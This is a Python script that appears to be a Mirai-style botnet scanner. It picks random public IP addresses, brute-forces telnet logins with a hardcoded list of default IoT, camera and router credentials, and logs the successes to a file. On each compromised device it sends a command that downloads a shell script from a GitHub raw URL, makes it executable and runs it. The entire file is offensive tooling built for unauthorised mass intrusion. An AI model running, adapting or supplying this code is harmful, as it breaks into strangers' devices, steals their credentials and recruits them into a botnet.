import threading
import sys, os, re, time, socket
from sys import stdout

if len(sys.argv) < 3:
    print "Usage: python "+sys.argv[0]+" <threads> <output file>"
    sys.exit()

combo = [
    "admin:admin",
    "root:founder88",
    "root:hikvision",
    "root:hi3518",
    "admin:ipcam_rt5350",
    "root:Zte521",
    "root:grouter",
    "default:v2mprt",
    "default:vhd1206",
    "root:vertex25ektks123",
    "root:IPCam@sw",
    "root:hslwificam",
    "vstarcam2015:20150602",
    "root:zte9x15",
    "admin:dvr2580222",
    "root:D13hh[",
    "admin:CenturyL1nk",
    "admin:ZmqVfoSIP",
    "admin:vodafone",
    "root:GM8182",
    "admin:Uq-4GIt3M",
    "default:nmgx_wapia",
    "admin:samsung",
    "admin:QwestM0dem",
    "root:taZz@23495859",
    "root:zhongxing",
    "admin:netgear1",
    "root:hg2x0",
    "root:taZz@01",
    "root:cam1029",
    "root:tsgoingon",
    "root:dvr",
    "root:camera",
    "admin:/ADMIN/",
    "root:twe8ehome",
    "telnet:telnet",
    "vodafone:vodafone",
    "default:tlJwpbo6",
    "default:S2fGqNFs",
    "default:OxhlwSG8",
    "root:qwertyuiop",
    "root:uClinux",
    "telnetadmin:telnetadmin",
    "root:2011vsta",
    "root:fidel123"
]


threads = int(sys.argv[1])
output_file = sys.argv[2]

class router(threading.Thread):
    def __init__ (self, ip):
        threading.Thread.__init__(self)
        self.ip = str(ip).rstrip('\n')
    def run(self):
        username = ""
        password = ""
        for passwd in combo:
            if ":n/a" in passwd:
                password=""
            else:
                password=passwd.split(":")[1]
            if "n/a:" in passwd:
                username=""
            else:
                username=passwd.split(":")[0]
            try:
                tn = socket.socket()
                tn.settimeout(8)
                tn.connect((self.ip,23))
            except Exception:
                tn.close()
                break
            try:
                hoho = ''
                hoho += readUntil(tn, "ogin:")
                if "ogin" in hoho:
                    tn.send(username + "\n")
                    time.sleep(0.09)
            except Exception:
                tn.close()
            try:
                hoho = ''
                hoho += readUntil(tn, "assword:")
                if "assword" in hoho:
                    tn.send(password + "\n")
                    time.sleep(0.8)
                else:
                    pass
            except Exception:
                tn.close()
            try:
                prompt = ''
                prompt += tn.recv(40960)
                if ">" in prompt and "ONT" not in prompt:
                    success = True
                elif "#" in prompt or "$" in prompt or "%" in prompt or "@" in prompt:
                    success = True              
                else:
                    tn.close()
                if success == True:
                    try:
                        os.system("echo "+self.ip+":23 "+username+":"+password+" >> "+output_file+"") # 1.1.1.1:23 user:pass # mirai
                        tn.send("wget https://raw.githubusercontent.com/20Matrix77/scanner/refs/heads/main/animma.sh; chmod 777 animma.sh; sh animma.sh\n")
                        print "\033[32m[\033[31m+\033[32m] \033[33mGOTCHA \033[31m-> \033[32m%s\033[37m:\033[33m%s\033[37m:\033[32m%s\033[37m"%(username, password, self.ip)
                        tn.close()
                        break
                    except:
                        tn.close()
                else:
                    tn.close()
            except Exception:
                tn.close()

def readUntil(tn, string, timeout=8):
    buf = ''
    start_time = time.time()
    while time.time() - start_time < timeout:
        buf += tn.recv(1024)
        time.sleep(0.01)
        if string in buf: return buf
    raise Exception('TIMEOUT!')

def Gen_IP():
    not_valid = [10,127,169,172,192]
    first = random.randrange(1,256)
    while first in not_valid:
        first = random.randrange(1,256)
    ip = ".".join([str(first),str(random.randrange(1,256)),
    str(random.randrange(1,256)),str(random.randrange(1,256))])
    return ip

def HaxThread():
    while 1:
        try:
            s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            IP = Gen_IP()
            s.connect((IP, 23))
            s.close()
            print "\033[32m[\033[31m+\033[32m] FOUND " + IP
            thread = router(IP)
            thread.start()
        except:
            pass

if __name__ == "__main__":
    threadcount = 0
    for i in xrange(0,threads):
        try:
            threading.Thread(target=HaxThread, args=()).start()
            threadcount += 1
        except:
            pass
    print "[*] Started " + str(threadcount) + " scanner threads!"
